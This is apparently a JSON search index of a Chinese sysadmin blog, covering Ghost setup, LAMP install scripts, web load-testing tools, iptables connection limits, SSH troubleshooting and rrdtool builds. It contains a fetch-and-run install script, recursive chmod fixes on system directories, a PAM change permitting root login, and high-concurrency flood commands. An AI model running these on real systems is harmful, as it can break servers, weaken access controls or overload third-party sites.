123456789101112Ghost作为一款博客新秀，采用Node.js语言编写，前后台简洁，占用资源少，支持 Markdown，作为个人建站博客程序具有天然优势。node.js 现在主流管理，我觉得还是挺不错的，编写文章自带Mrkdown而且界面比较炫酷。可以去官网访问下例子：www.ghost.com这里自己添加了一些评论功能。图片加速：我把图片都存放在qiniu上面。让打开时候提高了访问速率。网站加速：我做CDN加速一开始放在百度云加速，后来果断的不用了，因为不太稳定，而且解析有点问题，换阿里云服务器的根本原因，在国内访问比较快，而且阿里购买的服务器都有免费的5个G的流量防止DDOS。 一开始安装Ghost比较迷茫大部分参考中文官方文档在我github上面都有的： Ghost中文官方版：Ghost中文官方版 Ghost英文文档安装：Ghost英文文档安装 Ghost博客安装:Ghost博客安装，使用，更新一条龙教程 - 中文版 Ghost主题变更方法: Ghost主题变更 Ghost修改端口方法文档：Ghost修改端口方法文档 Ghost20种主题主题包下载：Ghost20种主题包 官方-Ghost升级方法: 官方-Ghost升级方法 一键安装Ghost博客: 一键安装Ghost博客 bitnami 下载一键安装Ghost脚本包: bitnami 下载一键安装Ghost脚本包 15个免费的Ghost博客主题: 15个免费的Ghost博客主题","raw":null,"content":null,"categories":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/categories/Blog/"}],"tags":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/tags/Blog/"}]},{"title":"LAMP一键安装包-Centos5/6下自动编译安装","slug":"Linux笔记/LAMP/LAMP一键安装包-CentOS 5:6下自动编译安装","date":"2014-12-07T10:43:45.000Z","updated":"2017-03-14T05:43:27.000Z","comments":true,"path":"2014/12/07/Linux笔记/LAMP/LAMP一键安装包-CentOS 5:6下自动编译安装/","link":"","permalink":"http://blog.yangcvo.me/2014/12/07/Linux笔记/LAMP/LAMP一键安装包-CentOS 5:6下自动编译安装/","excerpt":"","text":"LAMP一键安装包-CentOS 5/6下自动编译安装Apache,MySQL,PHP，phpmyadmin适用环境： 系统支持：CentOS-5 (32bit/64bit)、CentOS-6 (32bit/64bit) 内存要求：≥256M 安装了什么: 123456789101112131、Apache 2.2.22或Apache 2.4.22、MySQL 5.5.243、PHP 5.2.17或PHP 5.3.134、phpmyadmin 3.5.15、ZendOptimizer 3.3.9(可选，只适合PHP 5.2.17)6、xcache 1.3.2(可选)7、pure-ftpd-1.0.36（可选） 如何安装: 1234wget http://centos.googlecode.com/files/lamp0.4.tar.gztar xf lamp0.4.tar.gz &amp;&amp; cd lamp0.4 &amp;&amp; chmod +x lamp.sh &amp;&amp; ./lamp.sh如果下载失败可以试试这个：http://oak0aohum.bkt.clouddn.com/lamp0.4.tar.gz 安装其它 123451、执行脚本pureftpd.sh安装pure-ftpd。2、执行脚本zend.sh安装ZendOptimizer。3、执行脚本xcache.sh安装xcache。 使用提示： LAMP脚本使用 123lamp add(del,list)：创建（删除，列出）虚拟主机。lamp ftp(add|del|list)：创建（删除，列出）ftp用户。lamp uninstall：一键卸载lamp（卸载之前注意备份好数据！）。 程序目录 1234mysql目录: /usr/local/mysqlmysql data目录：/usr/local/mysql/dataphp目录: /usr/local/phpapache目录： /usr/local/apache 进程管理 123apache启动（停止｜重启｜重载配置文件）:service httpd start(stop|restart|reload)mysql（停止｜重启｜重载配置文件）:service mysqld start(stop|restart|reload)pureftpd（停止｜重启｜重载配置文件）:service pure-ftpd start(stop|restart|reload) 配置文件路径 1apache:/etc/httpd/conf mysql:/etc/my.cnf php:/etc/php.ini /etc/php.d pure-ftpd:/etc/pure-ftpd.conf ####使用注意 1、mysql root密码存放在/root/my.cnf文件中，添加虚拟主机的时候需要调用。如果修改了root密码，请手动更新my.cnf文件。 更新记录 123456789101112132012年6月17日：发布lamp0.41、增加自定义mysql data目录功能。2、openvz的vps自动关闭innodb。3、采用多核编译软件，提升编译速度。4、增加自定义网站目录功能。 2012年5月29日：发布lamp0.31、使用pure-ftpd代替vsftpd 2012年5月23日：发布lamp0.21、增加apache-2.4.2安装 2、增加ssl模块 3、增加mpm选择 2012年2月14日：发布lamp0.1","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"}]},{"title":"yum一键安装与卸载LAMP环境","slug":"Linux笔记/LAMP/yum一键安装与卸载LAMP环境","date":"2014-12-07T10:43:45.000Z","updated":"2017-03-14T05:43:37.000Z","comments":true,"path":"2014/12/07/Linux笔记/LAMP/yum一键安装与卸载LAMP环境/","link":"","permalink":"http://blog.yangcvo.me/2014/12/07/Linux笔记/LAMP/yum一键安装与卸载LAMP环境/","excerpt":"","text":"CentOS 可以通过 yum 安装:1yum -y install httpd php php-mysql mysql-server 启动服务 12service httpd status|start|stop|restart|reloadservice mysqld status|start|stop|restart|reload yum一键安装默认目录： 123456789101112131415161718网站根目录 /var/www/html/Apache主目录 /etc/httpd/Apache主配置文件 /etc/httpd/conf/httpd.confApache日志 /etc/httpd/logs/PHP主目录 /etc/php.d/PHP配置文件 /etc/php.iniPHP模块位置 /usr/lib/php/ 或者 /usr/lib64/php/MySQL配置文件 /etc/my.cnfMySQL数据库文件 /var/lib/mysql/运行 mysql_secure_installation 设置mysql根用户密码 由于目前使用的是lamp环境，目前为实验需要想把apache更换为litespeed web服务器。因为之前是通过yum安装的。 卸载前： 12345rpm -qa|grep httprpm -qa|grep phprpm -qa|grep mysql 查看目前安装的包后，通过 123yum remove mysql-*yum remove php-*yum remove httpd 卸载安装的包。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"},{"name":"LAMP","slug":"LAMP","permalink":"http://blog.yangcvo.me/tags/LAMP/"}]},{"title":"http load 压力测试","slug":"运维性能测试/http load 压力测试","date":"2014-12-07T10:25:43.000Z","updated":"2016-12-17T12:52:36.000Z","comments":true,"path":"2014/12/07/运维性能测试/http load 压力测试/","link":"","permalink":"http://blog.yangcvo.me/2014/12/07/运维性能测试/http load 压力测试/","excerpt":"","text":"http load 压力测试一、http_load简介基于linux平台的一种性能测工具。以并行复用的方式运行，用以测试web服务器的吞吐量与负载，测试web页面的性能。 优点： 1.基于命令行，简单、易于上手。2.小巧轻便，解压缩后不到100k。3.开源，免费。 缺点：1.仅适用于web页面的性能测试，不适用于访问数据库。2.测试结果分析有限3.平台依赖linux。 二、下载http_loadhttp_load的主页（实在是有点简陋）：http://www.acme.com/software/http_load/，点击Fetch the software 下载。或者直接在linux平台下，输入命令 1wget http://www.acme.com/software/http_load/http_load-12mar2006.tar.gz 下载到目录中。 三、安装http_load1234chmod 777http_load-12mar2006.tar.gz 改变权限tar xzvf http_load-12mar2006.tar.gzmakemake install 注：执行make前，需要先安装gcc编辑器 有时候报错如下： 123456789101112131415[root@localhost http_load-12mar2006]# make installrm -f /usr/local/bin/http_loadcp http_load /usr/local/binrm -f /usr/local/man/man1/http_load.1cp http_load.1 /usr/local/man/man1cp: 无法创建一般文件‘/usr/local/man/man1’: 没有那个文件或目录make: *** [install] 错误 1估计是/usr/local/man这个目录不存在导致的创建目录： mkdir /usr/local/man再次make install。OK啦。四、使用http_load-parallel 简写-p ：含义是并发的用户进程数。-fetches 简写-f ：含义是总计的访问次数-rate 简写-r ：含义是每秒的访问频率-seconds简写-s ：含义是总计的访问时间 url 是你要访问的网址名，参数可以是单个的网址也可以使包含网址的文件比如输入命令 1./http_load -rate 5 -seconds 10 urls 这里的usls 可以分析下 是个链接 五、结果分析123456789101129 fetches, 22 max parallel, 790047 bytes, in 10.0021 seconds29个请求，最大并发数22，总计传输的数据为790047bytes，运行时间10.0021秒。关注点：总请求数、最大并发进程数27243 mean bytes/connection每一连接平均传输的数据量790047/29=272432.8994 fetches/sec, 78988.5 bytes/sec每秒的响应请求为2.8994，每秒传递的数据为78988.5btyes/sec，关注点：每秒的响应请求数（对应LR中的每秒响应用户数）msecs/connect: 10.4312 mean, 23.104 max, 2.12 min每次连接的平均响应时间是10.4312 msecs，最大响应时间23.104 msecs，最小响应时间2.12 msecs。关注点：每个连接的平均响应时间（对应QTP中的response time，每连接响应用户时间 ）msecs/first-response: 381.184 mean, 3269.51 max, 41.067 minHTTP response codes:code 200 – 29 要注意是否系统遇到了瓶颈。特殊说明：测试结果中主要的指标是 fetches/sec、msecs/connect 这个选项，即服务器每秒能够响应的查询次数，用这个指标来衡量性能。似乎比 apache的ab准确率要高一些，也更有说服力一些。Qpt-每秒响应用户数和response time，每连接响应用户时间。测试的结果主要也是看这两个值。当然仅有这两个指标并不能完成对性能的分析，我们还需要对服务器的cpu、men进行分析，才能得出结论 第二种：二、webbench webbench是Linux下的一个网站压力测试工具，最多可以模拟3万个并发连接去测试网站的负载能力。下载地址可以到google搜，我这里给出一个下载地址：http://soft.vpser.net/test/webbench/webbench-1.5.tar.gz这个程序更小，解压后不到50K，呵呵安装非常简单 123#tar zxvf webbench-1.5.tar.gz#cd webbench-1.5#make &amp;&amp; make install 会在当前目录生成webbench可执行文件，直接可以使用了用法： webbench -c 并发数 -t 运行测试时间 URL 如： webbench -c 5000 -t 120 http://www.vpser.net 三、abab是apache自带的一款功能强大的测试工具安装了apache一般就自带了，用法可以查看它的说明 123456789101112131415161718192021222324252627282930$ ./ab./ab: wrong number of argumentsUsage: ./ab [options] [http://]hostname[:port]/pathOptions are:-n requests Number of requests to perform-c concurrency Number of multiple requests to make-t timelimit Seconds to max. wait for responses-p postfile File containing data to POST-T content-type Content-type header for POSTing-v verbosity How much troubleshooting info to print-w Print out results in HTML tables-i Use HEAD instead of GET-x attributes String to insert as table attributes-y attributes String to insert as tr attributes-z attributes String to insert as td or th attributes-C attribute Add cookie, eg. ‘Apache=1234. (repeatable)-H attribute Add Arbitrary header line, eg. ‘Accept-Encoding: gzip’Inserted after all normal header lines. (repeatable)-A attribute Add Basic WWW Authentication, the attributesare a colon separated username and password.-P attribute Add Basic Proxy Authentication, the attributesare a colon separated username and password.-X proxy:port Proxyserver and port number to use-V Print version number and exit-k Use HTTP KeepAlive feature-d Do not show percentiles served table.-S Do not show confidence estimators and warnings.-g filename Output collected data to gnuplot format file.-e filename Output CSV file with percentages served-h Display usage information (this message) 参数众多，一般我们用到的是-n 和-c 例如： 1./ab -c 1000 -n 100 http://www.vpser.net/index.php 这个表示同时处理1000个请求并运行100次index.php文件. 四、Siege一款开源的压力测试工具，可以根据配置对一个WEB站点进行多用户的并发访问，记录每个用户所有请求过程的相应时间，并在一定数量的并发访问下重复进行。官方：http://www.joedog.org/ 12345678Siege下载：http://soft.vpser.net/test/siege/siege-2.67.tar.gz解压：# tar -zxf siege-2.67.tar.gz进入解压目录：# cd siege-2.67/安装：#./configure ; make#make install 使用 1siege -c 200 -r 10 -f example.url -c是并发量，-r是重复次数。 url文件就是一个文本，每行都是一个url，它会从里面随机访问的。example.url内容:http://www.licess.cnhttp://www.vpser.nethttp://soft.vpser.net结果说明 12345678910111213Lifting the server siege… done.Transactions: 3419263 hits //完成419263次处理Availability: 100.00 % //100.00 % 成功率Elapsed time: 5999.69 secs //总共用时Data transferred: 84273.91 MB //共数据传输84273.91 MBResponse time: 0.37 secs //相应用时1.65秒：显示网络连接的速度Transaction rate: 569.91 trans/sec //均每秒完成 569.91 次处理：表示服务器后Throughput: 14.05 MB/sec //平均每秒传送数据Concurrency: 213.42 //实际最高并发数Successful transactions: 2564081 //成功处理次数Failed transactions: 11 //失败处理次数Longest transaction: 29.04 //每次传输所花最长时间Shortest transaction: 0.00 //每次传输所花最短时间","raw":null,"content":null,"categories":[{"name":"测试","slug":"测试","permalink":"http://blog.yangcvo.me/categories/测试/"}],"tags":[]},{"title":"at发送测压访问iptables防火墙控制并发访问","slug":"运维性能测试/at发送测压访问iptables防火墙控制并发访问","date":"2014-12-07T10:25:43.000Z","updated":"2016-12-17T11:12:42.000Z","comments":true,"path":"2014/12/07/运维性能测试/at发送测压访问iptables防火墙控制并发访问/","link":"","permalink":"http://blog.yangcvo.me/2014/12/07/运维性能测试/at发送测压访问iptables防火墙控制并发访问/","excerpt":"","text":"A台 ： 192.168.1.1 做问httpd 的访问者 B台 ： 192.168.1.2 做为向A发送的请求者 访问前 A查看下iptables 是否开启 ，把他关闭了。才能访问 B 请求 1# at -n 10000 -c 40 http://192.168.1.1/1.txt A 查看请求 12netstat -an | grep 80 | grep 192.168.1.2 | grep EST -c32 然后查看当前的状态 [root@bjny-bgp-test-3 html]# w 16:44:27 up 11 days, 23:41, 14 users, load average: 0.15, 0.34 0.56 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT wangf tty1 - 04Sep15 11days 0.06s 0.06s -bash huangyq pts/0 125.122.26.233 15:34 19:38 0.35s 0.18s ssh root@211.137.43.94 这里负载变高了。然后我们在A机器做条规则 A查看 iptables -I INPUT -p tcp –dport 80 -s 192.168.1.2 -m connlimit –connlimit-above 5 -j REJECT 这样就是访问80这个IP端口 请求只能限制5次 然后再查看下B请求发送的状态 [root@sccd-d-test-76 ~]# ab -n 1000000 -c 40 http://192.168.1.1/1m.jpg This is ApacheBench, Version 2.3 &lt;$Revision: 655654 $&gt; Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking 192.168.1.2 (be patient) apr_socket_recv: Connection refused (111) 这里就可以看到访问受限了。 如果把上面的40 一次发送 换下 A上面可以看到 1234[root@bjny-bgp-test-3 html]# netstat -an | grep 80 | grep 182.140.239.76 | grep EST -c 4[root@bjny-bgp-test-3 html]# netstat -an | grep 80 | grep 182.140.239.76 | grep EST -c 4[root@bjny-bgp-test-3 html]# netstat -an | grep 80 | grep 182.140.239.76 | grep EST -c 4[root@bjny-bgp-test-3 html]# netstat -an | grep 80 | grep 182.140.239.76 | grep EST -c 4 B就不会有报错请求了。","raw":null,"content":null,"categories":[{"name":"测试","slug":"测试","permalink":"http://blog.yangcvo.me/categories/测试/"}],"tags":[]},{"title":"SSH scp error no hostkey alg","slug":"Linux笔记/SSH/SSH scp error no hostkey alg","date":"2014-11-27T07:23:10.000Z","updated":"2017-03-24T08:18:37.000Z","comments":true,"path":"2014/11/27/Linux笔记/SSH/SSH scp error no hostkey alg/","link":"","permalink":"http://blog.yangcvo.me/2014/11/27/Linux笔记/SSH/SSH scp error no hostkey alg/","excerpt":"","text":"SSH scp error no hostkey algssh works well but when you try to copy a file via scp you get this error 1no hostkey alg Go on your server and check if you have /etc/ssh/ssh_host_rsa_key and /etc/ssh/ssh_host_dsa_key files, if not, generate them 12ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_keyssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key SSH 登录是错误：Permission denied (publickey,gssapi-with-mic)123$ ssh root@192.168.xx.xxPermission denied (publickey,gssapi-with-mic). 报了这么个错，原因是我上次做测试时修改了/etc/ssh/sshd_config 中的&quot;PasswordAuthentication&quot;参数值为”no”,修改回”yes”，重启sshd服务即可。 这里我做了免秘钥ssh-key认证，可是还提示我输入密码。ssh-copy-id 192.168.1.210 已经把公钥传输到对应机器上面。可是ssh root@192.168.1.210 还是提示密码。 这里我做了测试： 1234567891011121314151617181920212223242526272829303132333435363738394041ssh -vvv root@192.168.1.210OpenSSH_5.2p1+sftpfilecontrol-v1.3, OpenSSL 0.9.8k 25 Mar 2009HP-UX Secure Shell-A.05.20.004, HP-UX Secure Shell versiondebug1: Reading configuration data /root/etc/ssh/sshd_configdebug3: RNG is ready, skipping seedingdebug2: ssh_connect: needpriv 0debug1: Connecting to arnold [172.16.96.6] port 22.debug1: Connection established.debug1: identity file /root/.ssh/identity type -1debug3: Not a RSA1 key file /root/.ssh/id_rsa.debug2: key_type_from_name: unknown key type '-----BEGIN'debug3: key_read: missing keytypedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug2: key_type_from_name: unknown key type '-----BEGIN'debug3: key_read: missing keytypedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug3: key_read: missing whitespacedebug2: key_type_from_name: unknown key type '-----END'.... 解决思路： 这里我查看了192.168.1.210 服务器SELinux已关闭的。防火墙也没问题sshd服务也没有问题。配置也没问题。后来我查看登录日志： 123456789[root@tomcat_C1 ~]$ tailf /var/log/secureMar 24 16:00:48 tomcat_C1 sshd[15053]: pam_unix(sshd:session): session closed for user rootMar 24 16:00:55 tomcat_C1 sshd[15061]: Authentication refused: bad ownership or modes for directory /rootMar 24 16:00:59 tomcat_C1 sshd[15061]: Accepted password for root from 192.168.1.220 port 33810 ssh2Mar 24 16:00:59 tomcat_C1 sshd[15061]: pam_unix(sshd:session): session opened for user root by (uid=0)Mar 24 16:02:29 tomcat_C1 sshd[13733]: Received signal 15; terminating.Mar 24 16:02:30 tomcat_C1 sshd[15143]: Server listening on 0.0.0.0 port 22.Mar 24 16:02:30 tomcat_C1 sshd[15143]: Server listening on :: port 22.Mar 24 16:04:48 tomcat_C1 sshd[15160]: Authentication refused: bad ownership or modes for directory /root 认证拒绝：/root/目录没权限呗。所以这里我在这台服务器设置了下权限。775 123456789101112[root@tomcat_C1 ~]$ chmod 755 /root/[root@tomcat_C1 ~]$ tailf /var/log/secureMar 24 16:00:48 tomcat_C1 sshd[15053]: pam_unix(sshd:session): session closed for user rootMar 24 16:00:55 tomcat_C1 sshd[15061]: Authentication refused: bad ownership or modes for directory /rootMar 24 16:00:59 tomcat_C1 sshd[15061]: Accepted password for root from 192.168.1.220 port 33810 ssh2Mar 24 16:00:59 tomcat_C1 sshd[15061]: pam_unix(sshd:session): session opened for user root by (uid=0)Mar 24 16:02:29 tomcat_C1 sshd[13733]: Received signal 15; terminating.Mar 24 16:02:30 tomcat_C1 sshd[15143]: Server listening on 0.0.0.0 port 22.Mar 24 16:02:30 tomcat_C1 sshd[15143]: Server listening on :: port 22.Mar 24 16:04:48 tomcat_C1 sshd[15160]: Authentication refused: bad ownership or modes for directory /rootMar 24 16:07:19 tomcat_C1 sshd[15197]: Accepted publickey for root from 192.168.1.220 port 42620 ssh2Mar 24 16:07:19 tomcat_C1 sshd[15197]: pam_unix(sshd:session): session opened for user root by (uid=0) 免秘钥已设置通了。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"}]},{"title":"ACL 修改权限ssh登录报ssh_exchange_identification: read:Connection reset by peer无法登陆问题","slug":"Linux笔记/SSH/修改权限ssh登陆出现ssh-exchange-identification-read-Connection-reset-by-peer无法登陆问题","date":"2014-11-27T07:23:10.000Z","updated":"2017-04-05T15:20:41.000Z","comments":true,"path":"2014/11/27/Linux笔记/SSH/修改权限ssh登陆出现ssh-exchange-identification-read-Connection-reset-by-peer无法登陆问题/","link":"","permalink":"http://blog.yangcvo.me/2014/11/27/Linux笔记/SSH/修改权限ssh登陆出现ssh-exchange-identification-read-Connection-reset-by-peer无法登陆问题/","excerpt":"","text":"ACL修改权限出现了严重的问题： root用户下使用ACL在给开发给予某个文件夹下的所有文件改权限的时候，用了setfacl命令，咋一看这个命令没啥很正常，也能执行，但是后面的提示让人感觉很不对劲， 有一个/，这是个很危险的命令，有点常识的人都知道，根目录下的文件权限不可以乱动啊，当时吓了一跳，于是另开一个终端怎么也连接不上. 12ssh root@192.168.1.204Connection reset by 192.168.1.204 root用户登陆出现报错 12ssh admin@192.168.1.204ssh_exchange_identification: read: Connection reset by peer 普通用户登陆也出现同样的报错。 Google下 远程连接无法连接，用下面的命令，看详细的连接过程： 12345678910111213141516171819202122232425262728➜ ~ ssh -v root@192.168.1.204OpenSSH_6.9p1, LibreSSL 2.1.8debug1: Reading configuration data /etc/ssh/ssh_configdebug1: /etc/ssh/ssh_config line 21: Applying options for *debug1: Connecting to 192.168.1.204 [192.168.1.204] port 22.debug1: Connection established.debug1: identity file /Users/jules/.ssh/id_rsa type 1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_rsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_dsa type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_dsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_ecdsa type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_ecdsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_ed25519 type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_ed25519-cert type -1debug1: Enabling compatibility mode for protocol 2.0debug1: Local version string SSH-2.0-OpenSSH_6.9debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1debug1: match: OpenSSH_6.6.1 pat OpenSSH_6.6.1* compat 0x04000000debug1: Authenticating to 192.168.1.204:22 as 'root'debug1: SSH2_MSG_KEXINIT sentConnection closed by 192.168.1.204 百度了很多，以关键词ssh_exchange_identification: read: Connection reset by peer，搜索搜到不少网友们遇到这样的问题. 有的是ip被加入到限制列表中了,有的是dns无法解析主机名，有的是说误将权限改了，这里我也看了下一些文档上面说。将/etc/ssh/目录下的所有文件改成400 权限，照着做了，还是不行，报同样的错误。 1chmod -R 400 /etc/sshd/* 如果还是不行这一步那么看下权限。 看到一篇外国的文档： 因为我这里设置的是普通用户在var目录下面所有权限。 去/var下看了看，果然权限很大，都是777,cd 到empty目录，果然有ssh这个文件夹，在cd进去，啥也没有了。于是直接执行两条命令：cd /varchmod -R 755 *然后就再次尝试了远程连接了下，竟然ok了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748ssh -v root@192.168.1.204OpenSSH_6.9p1, LibreSSL 2.1.8debug1: Reading configuration data /etc/ssh/ssh_configdebug1: /etc/ssh/ssh_config line 21: Applying options for *debug1: Connecting to 192.168.1.204 [192.168.1.204] port 22.debug1: Connection established.debug1: identity file /Users/jules/.ssh/id_rsa type 1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_rsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_dsa type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_dsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_ecdsa type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_ecdsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_ed25519 type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/jules/.ssh/id_ed25519-cert type -1debug1: Enabling compatibility mode for protocol 2.0debug1: Local version string SSH-2.0-OpenSSH_6.9debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1debug1: match: OpenSSH_6.6.1 pat OpenSSH_6.6.1* compat 0x04000000debug1: Authenticating to 192.168.1.204:22 as 'root'debug1: SSH2_MSG_KEXINIT sentdebug1: SSH2_MSG_KEXINIT receiveddebug1: kex: server-&gt;client chacha20-poly1305@openssh.com &lt;implicit&gt; nonedebug1: kex: client-&gt;server chacha20-poly1305@openssh.com &lt;implicit&gt; nonedebug1: expecting SSH2_MSG_KEX_ECDH_REPLYdebug1: Server host key: ecdsa-sha2-nistp256 SHA256:W8lF3wwReKmYPPwp8F3AafqfnnM5Dxl669vTaEkzmwUdebug1: Host '192.168.1.204' is known and matches the ECDSA host key.debug1: Found key in /Users/jules/.ssh/known_hosts:32debug1: SSH2_MSG_NEWKEYS sentdebug1: expecting SSH2_MSG_NEWKEYSdebug1: SSH2_MSG_NEWKEYS receiveddebug1: SSH2_MSG_SERVICE_REQUEST sentdebug1: SSH2_MSG_SERVICE_ACCEPT receiveddebug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,passworddebug1: Next authentication method: publickeydebug1: Offering RSA public key: /Users/jules/.ssh/id_rsadebug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,passworddebug1: Trying private key: /Users/jules/.ssh/id_dsadebug1: Trying private key: /Users/jules/.ssh/id_ecdsadebug1: Trying private key: /Users/jules/.ssh/id_ed25519debug1: Next authentication method: passwordroot@192.168.1.204's password: 这里一般不建议用root权限去操作。 已经涨记性了修改这些ACL权限很容易导致琐死权限。 报错二：Connection closed by 192.168.1.2201234567-rw------- 1 root root 668 9月 1 14:40 ssh_host_dsa_key-rw-r--r-- 1 root root 590 9月 1 14:40 ssh_host_dsa_key.pub-rw-r--r-- 1 root root 0 9月 1 14:40 ssh_host_ecdsa_key.pub-rw------- 1 root root 963 9月 1 14:40 ssh_host_key-rw-r--r-- 1 root root 627 9月 1 14:40 ssh_host_key.pub-rw------- 1 root root 1675 9月 1 14:40 ssh_host_rsa_key-rw-r--r-- 1 root root 382 9月 1 14:40 ssh_host_rsa_key.pub 这些查看下是否丢失，如果丢失需要重新生成。 前提是你还没有退出登录。 1234567 touch /etc/ssh/ssh_host_ecdsa_key.pub service sshd restart停止 sshd： [确定]生成 SSH2 RSA 主机键： [确定]生成 SSH1 RSA 主机键： [确定]正在生成 SSH2 DSA 主机键： [确定]正在启动 sshd： [确定] 就可以搞定了。 问题三：SSH 登录时出现如下错误：requirement “uid &gt;= 1000” not met by user “root”问题描述登录云服务器 ECS （Elastic Compute Server） Linux 服务器时，即便输入了正确的密码，也无法正常登录。该问题出现时，管理终端 或 SSH 客户端其中一种方式可以正常登录，或者两种方式均无法正常登录。同时，secure 日志中出现类似如下错误信息： pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;. 问题原因PAM 相关模块策略配置，禁止了 UID 小于 1000 的用户进行登录。 处理办法要解决此问题，请进行如下配置检查： 通过 SSH 客户端或 管理终端 登录服务器。通过 cat 等指令查看异常登录模式，对应的 PAM 配置文件。说明如下：文件 功能说明 /etc/pam.d/login 控制台（管理终端）对应配置文件 /etc/pam.d/sshd 登录对应配置文件 /etc/pam.d/system-auth 系统全局配置文件 注：每个启用了 PAM 的应用程序，在 /etc/pam.d 目录中都有对应的同名配置文件。例如，login 命令的配置文件是 /etc/pam.d/login，可以在相应配置文件中配置具体的策略。 检查前述配置文件中，是否有类似如下配置信息： auth required pam_succeed_if.so uid &gt;= 1000 如果需要修改相关策略配置，在继续之前建议进行文件备份。使用 vi 等编辑器，修改相应配置文件中的上述配置，或者整个删除或注释（在最开头添加 # 号）整行配置，比如： auth required pam_succeed_if.so uid &lt;= 1000 # 修改策略 # auth required pam_succeed_if.so uid &gt;= 1000 #取消相关配置 尝试重新登录服务器。如果还有问题，可以参阅云服务器 ECS Linux SSH 无法登录问题排查指引做进一步排查分析。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"}]},{"title":"rrdtool 编译安装一步一步解决多多依赖关系","slug":"Linux笔记/rrdtool/RRDTOOL编译安装一步一步解决多多依赖关系","date":"2014-11-24T10:13:30.000Z","updated":"2017-03-14T05:43:47.000Z","comments":true,"path":"2014/11/24/Linux笔记/rrdtool/RRDTOOL编译安装一步一步解决多多依赖关系/","link":"","permalink":"http://blog.yangcvo.me/2014/11/24/Linux笔记/rrdtool/RRDTOOL编译安装一步一步解决多多依赖关系/","excerpt":"","text":"RRDTOOL 编译安装一步一步解决多多依赖关系在一些监控软件中需要借助rrdtool绘图，然后安装rrdtool这个画图工具的时候经常报错，下面就简单说明下安装步骤（Cenetos6.5 64bit）。 介绍RRDTOOL 是一个基于时间片的日志和绘图工具，有了她你可以轻松的绘制各种基于时间的可视化数据，用于做统计和监控非常合适。著名的开源监控软件Ganglia 就是采用的RRDTOOL。为什么要特别提到RRDTOOL的安装，因为我在安装RRDTOOL的过程中遇到了各种问题和困难。先说明一下我安装的环境是 CentOS5.7。先说一下教训，尽量使用root权限或者具有sudo权限的账号安装RRDTOOL。 笔者一开始尝试着在一台不具备root权限的机器上安装，首先遇到的问题就是系统无法正确的识别到共享包，需要设置PKG_CONFIG_PATH和LD_LIBRARAY_PATH但是这还没有完，最后libX11-devel的安装彻底让我灰心，其依赖然我彻底失去了信心。但也许有更好的在非root权限账号安装的办法，希望大家分享;-) 安装步骤： 下载软件包： 去http://oss.oetiker.ch/rrdtool/pub/?M=D 下载最新的RRD版本，并且在http://oss.oetiker.ch/rrdtool/pub/libs/ 下载相应的依赖包，也许是作者本身意识到其依赖之多，所以在其下载站就提供了对应依赖的下载。这里如果失效的话，网页访问不了，下面我会把该对应的依赖包做成链接让大家下载。不需要再次去寻找依赖包。 =_=我在这次安装中用到的包如下： （全部都是最新版的 安装就不会报错，如果是低版本的 我安装都会报错，那时候低版本报错安装 安装了一4个小时。因为很多依赖包安装报错，很多依赖包中又要安装其他包。）下面一次成功的 最新安装包： pkgconfig-0.18.tar.gz zlib-1.2.8.tar.gz libpng-1.6.18.tar.gz freetype-2.6.tar.gz libxml2-2.6.3.tar.gz 